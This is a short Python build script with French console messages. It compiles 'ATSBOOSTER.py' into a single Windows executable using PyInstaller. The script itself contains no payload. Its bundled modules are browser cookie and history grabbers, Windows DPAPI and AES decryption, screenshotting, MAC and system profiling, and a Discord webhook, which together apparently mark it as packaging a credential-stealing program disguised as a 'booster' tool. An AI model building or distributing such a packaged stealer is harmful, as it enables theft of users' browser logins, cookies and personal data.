import subprocess
import shutil
import os
import sys

def build():
    print("=== ATSBOOSTER - Build EXE ===\n")

    print("[1/3] Installation des dependances...")
    subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt",
                    "pyinstaller", "--quiet"])

    print("\n[2/3] Nettoyage des anciens builds...")
    for d in ["build", "dist", "__pycache__"]:
        if os.path.exists(d):
            shutil.rmtree(d, ignore_errors=True)
    if os.path.exists("ATSBOOSTER.spec"):
        os.remove("ATSBOOSTER.spec")

    print("\n[3/3] Compilation de l' EXE...")
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--name", "ATSBOOSTER",
        "--console",
        "--clean",
        "--noconfirm",
        "--hidden-import", "browser_cookie3",
        "--hidden-import", "browser_history",
        "--hidden-import", "discord_webhook",
        "--hidden-import", "Crypto.Cipher.AES",
        "--hidden-import", "win32crypt",
        "--hidden-import", "win32api",
        "--hidden-import", "win32con",
        "--hidden-import", "pyautogui",
        "--hidden-import", "cpuinfo",
        "--hidden-import", "psutil",
        "--hidden-import", "getmac",
        "--hidden-import", "prettytable",
        "--collect-all", "browser_cookie3",
        "--collect-all", "browser_history",
        "--collect-all", "discord_webhook",
        "ATSBOOSTER.py",
    ]
    subprocess.run(cmd)

    exe_path = os.path.join("dist", "ATSBOOSTER.exe")
    if os.path.exists(exe_path):
        shutil.copy2(exe_path, "ATSBOOSTER.exe")
        print(f"\n=== BUILD REUSSI ! ===")
        print(f"EXE : dist/ATSBOOSTER.exe")
        print(f"Copie : ATSBOOSTER.exe")
    else:
        print("\n=== ECHEC DU BUILD ===")

if __name__ == "__main__":
    build()
